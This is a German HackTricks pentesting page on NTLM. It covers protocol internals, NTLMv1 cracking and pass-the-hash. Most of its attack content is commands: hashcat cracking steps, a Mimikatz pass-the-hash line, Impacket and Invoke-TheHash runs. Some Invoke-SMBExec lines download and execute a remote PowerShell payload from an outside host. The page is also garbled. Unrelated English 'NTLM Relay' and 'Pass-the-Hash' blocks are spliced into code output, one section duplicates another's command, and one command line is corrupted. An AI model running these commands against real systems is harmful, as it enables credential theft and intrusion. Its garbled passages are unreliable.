# NTLM

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) **Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder** folgen Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>

## Grundlegende Informationen

In Umgebungen, in denen **Windows XP und Server 2003** im Einsatz sind, werden LM (Lan Manager)-Hashes verwendet, obwohl bekannt ist, dass diese leicht kompromittiert werden können. Ein bestimmter LM-Hash, `AAD3B435B51404EEAAD3B435B51404EE`, zeigt ein Szenario an, in dem LM nicht verwendet wird und den Hash für einen leeren String darstellt.

Standardmäßig ist das **Kerberos**-Authentifizierungsprotokoll die primäre Methode. NTLM (NT LAN Manager) wird unter bestimmten Umständen eingesetzt: Fehlen von Active Directory, Nichtexistenz der Domäne, Fehlfunktion von Kerberos aufgrund falscher Konfiguration oder wenn Verbindungen unter Verwendung einer IP-Adresse anstelle eines gültigen Hostnamens versucht werden.

Das Vorhandensein des **"NTLMSSP"**-Headers in Netzwerkpaketen signalisiert einen NTLM-Authentifizierungsprozess.

Die Unterstützung der Authentifizierungsprotokolle - LM, NTLMv1 und NTLMv2 - wird durch eine spezifische DLL erleichtert, die sich unter `%windir%\Windows\System32\msv1\_0.dll` befindet.

**Hauptpunkte**:

* LM-Hashes sind anfällig und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) zeigt an, dass er nicht verwendet wird.
* Kerberos ist die Standardauthentifizierungsmethode, wobei NTLM nur unter bestimmten Bedingungen verwendet wird.
* NTLM-Authentifizierungspakete sind am "NTLMSSP"-Header erkennbar.
* Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.

## LM, NTLMv1 und NTLMv2

Sie können überprüfen und konfigurieren, welches Protokoll verwendet wird:

### GUI

Führen Sie _secpol.msc_ aus -> Lokale Richtlinien -> Sicherheitsoptionen -> Netzwerksicherheit: LAN-Manager-Authentifizierungsstufe. Es gibt 6 Stufen (von 0 bis 5).

![](<../../.gitbook/assets/image (919).png>)

### Registrierung

Dies wird die Stufe 5 setzen:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Mögliche Werte:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Grundlegendes NTLM-Domänenauthentifizierungsschema

1. Der **Benutzer** gibt seine **Anmeldeinformationen** ein.
2. Die Client-Maschine **sendet eine Authentifizierungsanforderung**, indem sie den **Domänennamen** und den **Benutzernamen** sendet.
3. Der **Server** sendet die **Herausforderung**.
4. Der **Client verschlüsselt** die **Herausforderung** mit dem Hash des Passworts als Schlüssel und sendet sie als Antwort.
5. Der **Server sendet** an den **Domänencontroller den Domänennamen, den Benutzernamen, die Herausforderung und die Antwort**. Wenn **kein Active Directory konfiguriert ist** oder der Domänenname der Name des Servers ist, werden die Anmeldeinformationen **lokal überprüft**.
6. Der **Domänencontroller überprüft, ob alles korrekt ist** und sendet die Informationen an den Server.

Der **Server** und der **Domänencontroller** können über den **Netlogon-Server** einen **sicheren Kanal** erstellen, da der Domänencontroller das Passwort des Servers kennt (es befindet sich in der **NTDS.DIT**-Datenbank).

### Lokales NTLM-Authentifizierungsschema

Die Authentifizierung erfolgt wie zuvor erwähnt, aber der **Server kennt den Hash des Benutzers**, der versucht, sich im **SAM**-Datei zu authentifizieren. Anstatt den Domänencontroller zu fragen, überprüft der **Server selbst**, ob der Benutzer sich authentifizieren kann.

### NTLMv1-Herausforderung

Die **Herausforderung ist 8 Bytes** lang und die **Antwort ist 24 Bytes** lang.

Der **Hash NT (16 Bytes)** ist in **3 Teile zu je 7 Bytes** aufgeteilt (7B + 7B + (2B+0x00\*5)): der **letzte Teil ist mit Nullen gefüllt**. Dann wird die **Herausforderung** separat mit jedem Teil verschlüsselt und die **resultierenden** verschlüsselten Bytes werden **zusammengefügt**. Insgesamt: 8B + 8B + 8B = 24 Bytes.

**Probleme**:

* Mangel an **Zufälligkeit**
* Die 3 Teile können **einzeln angegriffen** werden, um den NT-Hash zu finden
* **DES ist knackbar**
* Der 3. Schlüssel besteht immer aus **5 Nullen**.
* Bei derselben Herausforderung ist die **Antwort gleich**. Sie können also dem Opfer als **Herausforderung** den String "**1122334455667788**" geben und die Antwort mit **vorab berechneten Rainbow-Tabellen angreifen**.

### NTLMv1-Angriff

Heutzutage ist es immer seltener, Umgebungen mit konfigurierter Unconstrained Delegation zu finden, aber das bedeutet nicht, dass Sie nicht einen **Druckwarteschlangendienst missbrauchen** können, der konfiguriert ist.

Sie könnten einige Anmeldeinformationen/Sitzungen, die Sie bereits im AD haben, missbrauchen, um den Drucker zu bitten, sich gegen einen **Host unter Ihrer Kontrolle zu authentifizieren**. Dann können Sie mit `metasploit auxiliary/server/capture/smb` oder `responder` die **Authentifizierungsherausforderung auf 1122334455667788** setzen, den Authentifizierungsversuch erfassen und wenn er mit **NTLMv1** durchgeführt wurde, können Sie ihn **knacken**.\
Wenn Sie `responder` verwenden, könnten Sie versuchen, die Option `--lm` zu verwenden, um zu versuchen, die **Authentifizierung zu downgraden**.\
_Beachten Sie, dass für diese Technik die Authentifizierung mit NTLMv1 durchgeführt werden muss (NTLMv2 ist ungültig)._

Denken Sie daran, dass der Drucker das Computerkonto während der Authentifizierung verwendet und Computerkonten **lange und zufällige Passwörter** verwenden, die Sie **wahrscheinlich nicht mit gängigen Wörterbüchern knacken können**. Aber die **NTLMv1**-Authentifizierung **verwendet DES** ([mehr Informationen hier](./#ntlmv1-challenge)), also können Sie mit speziellen Diensten zum Knacken von DES wie [https://crack.sh/](https://crack.sh) oder [https://ntlmv1.com/](https://ntlmv1.com) es knacken.

### NTLMv1-Angriff mit hashcat

NTLMv1 kann auch mit dem NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) gebrochen werden, das NTLMv1-Nachrichten in einem Format formatiert, das mit hashcat gebrochen werden kann.

Der Befehl
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
### NTLM Relay Attack

#### Introduction

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. This attack involves relaying NTLM authentication messages from a target host to a victim host, allowing the attacker to impersonate the target and gain unauthorized access to resources on the victim's system.

#### How it Works

1. The attacker intercepts an NTLM authentication request from the target host.
2. The attacker relays the authentication request to the victim host.
3. The victim host processes the authentication request, believing it is coming from the target host.
4. If successful, the attacker gains access to the victim host using the target host's credentials.

#### Mitigation

To protect against NTLM relay attacks, consider implementing the following measures:

- **Enforce SMB Signing:** Require SMB signing to prevent attackers from tampering with authentication messages.
- **Enable Extended Protection for Authentication:** Helps protect against NTLM relay attacks by requiring channel binding tokens.
- **Disable NTLM:** Consider disabling NTLM authentication in favor of more secure protocols like Kerberos.

By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Introduction

NTLM relay attacks are a common technique used by attackers to escalate privileges within a network. By intercepting and relaying NTLM authentication messages, an attacker can impersonate a legitimate user or machine to gain unauthorized access to resources.

## How it works

1. The attacker intercepts an NTLM authentication request from a victim machine to a server.
2. The attacker relays the authentication request to another server within the network.
3. The second server responds to the authentication request, believing it is coming from the victim machine.
4. If successful, the attacker can access resources on the second server using the victim's credentials.

## Mitigation

To prevent NTLM relay attacks, it is recommended to:
- Implement SMB signing to prevent message tampering.
- Enforce LDAP signing and channel binding.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.

By following these best practices, organizations can reduce the risk of falling victim to NTLM relay attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Führen Sie hashcat aus (am besten verteilt über ein Tool wie hashtopolis), da dies ansonsten mehrere Tage dauern wird.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In diesem Fall wissen wir, dass das Passwort dafür "password" ist, also werden wir für Demonstrationszwecke betrügen:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Wir müssen nun die Hashcat-Utilities verwenden, um die geknackten DES-Schlüssel in Teile des NTLM-Hashes umzuwandeln:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Schließlich der letzte Teil:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### Windows Hardening: NTLM

---

#### Pass-the-Hash

Pass-the-Hash is a technique that allows an attacker to authenticate to a remote server or service by using the NTLM hash of a user's password, instead of requiring the plaintext password itself. This can be achieved by extracting the NTLM hash from memory or from a compromised system.

---

#### Protection Against Pass-the-Hash Attacks

To protect against Pass-the-Hash attacks, it is recommended to implement the following measures:

1. **Use NTLMv2**: NTLMv2 is more secure than NTLM and is resistant to Pass-the-Hash attacks.
2. **Enforce SMB Signing**: Enabling SMB signing can help prevent Pass-the-Hash attacks by ensuring the integrity of the data transferred over SMB.
3. **Restrict NTLM**: Limit the use of NTLM authentication in the network to reduce the attack surface for Pass-the-Hash attacks.
4. **Monitor Event Logs**: Monitor Windows event logs for signs of Pass-the-Hash attacks or other suspicious activities.

By following these recommendations, organizations can better protect their systems and data from Pass-the-Hash attacks.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Die **Herausforderungslänge beträgt 8 Bytes** und es werden **2 Antworten gesendet**: Eine ist **24 Bytes** lang und die Länge der **anderen** ist **variabel**.

**Die erste Antwort** wird erstellt, indem der **String** aus **Client und Domain** mit dem **Hash MD4** des **NT-Hashes** verschlüsselt wird. Anschließend wird das **Ergebnis** als **Schlüssel** verwendet, um unter Verwendung von **HMAC\_MD5** die **Herausforderung** zu verschlüsseln. Dazu wird **eine Client-Herausforderung von 8 Bytes hinzugefügt**. Insgesamt: 24 B.

Die **zweite Antwort** wird unter Verwendung von **mehreren Werten** (eine neue Client-Herausforderung, ein **Zeitstempel** zur Vermeidung von **Wiederholungsangriffen**...) erstellt.

Wenn Sie einen **pcap haben, der einen erfolgreichen Authentifizierungsprozess erfasst hat**, können Sie dieser Anleitung folgen, um den Domainnamen, Benutzernamen, die Herausforderung und die Antwort zu erhalten und zu versuchen, das Passwort zu knacken: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Sobald Sie den Hash des Opfers haben**, können Sie ihn **imitieren**.\
Sie müssen ein **Tool** verwenden, das die **NTLM-Authentifizierung unter Verwendung** dieses **Hashes durchführt**, **oder** Sie könnten eine neue **Sitzungsanmeldung erstellen** und diesen **Hash** in den **LSASS injizieren**, sodass bei jeder **NTLM-Authentifizierung dieser Hash verwendet wird.** Die letzte Option ist das, was mimikatz macht.

**Bitte denken Sie daran, dass Sie Pass-the-Hash-Angriffe auch unter Verwendung von Computerkonten durchführen können.**

### **Mimikatz**

**Muss als Administrator ausgeführt werden**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dies startet einen Prozess, der den Benutzern gehört, die Mimikatz gestartet haben, aber intern in LSASS sind die gespeicherten Anmeldedaten diejenigen innerhalb der Mimikatz-Parameter. Dann können Sie auf Netzwerkressourcen zugreifen, als wären Sie dieser Benutzer (ähnlich wie der `runas /netonly` Trick, aber Sie müssen das Klartextpasswort nicht kennen).

### Pass-the-Hash von Linux aus

Sie können Codeausführung in Windows-Maschinen unter Verwendung von Pass-the-Hash von Linux aus erlangen.\
[**Hier erfahren Sie, wie es geht.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows kompilierte Tools

Sie können [Impacket-Binärdateien für Windows hier herunterladen](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In diesem Fall müssen Sie einen Befehl angeben, cmd.exe und powershell.exe sind nicht gültig, um eine interaktive Shell zu erhalten)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Es gibt noch mehr Impacket-Binärdateien...

### Invoke-TheHash

Sie können die Powershell-Skripte von hier erhalten: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Aufrufen von WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Aufrufen von SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Aufrufen von SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Diese Funktion ist eine **Mischung aus allen anderen**. Sie können **mehrere Hosts** übergeben, **einige ausschließen** und die **Option** auswählen, die Sie verwenden möchten (_SMBExec, WMIExec, SMBClient, SMBEnum_). Wenn Sie **SMBExec** und **WMIExec** auswählen, aber keinen _**Befehls**_-Parameter angeben, wird nur **überprüft**, ob Sie **ausreichende Berechtigungen** haben.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Muss als Administrator ausgeführt werden**

Dieses Tool wird dasselbe wie mimikatz tun (LSASS-Speicher modifizieren).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manuelle Windows-Remoteausführung mit Benutzername und Passwort

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extrahieren von Anmeldeinformationen von einem Windows-Host

**Für weitere Informationen darüber, wie Sie Anmeldeinformationen von einem Windows-Host erhalten können, sollten Sie diese Seite lesen:**

[**how to obtain credentials from a Windows host you should read this page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)

## NTLM-Relay und Responder

**Lesen Sie hier eine ausführlichere Anleitung, wie Sie diese Angriffe durchführen können:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Parsen von NTLM-Herausforderungen aus einem Netzwerkcapture

**Sie können** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **verwenden**
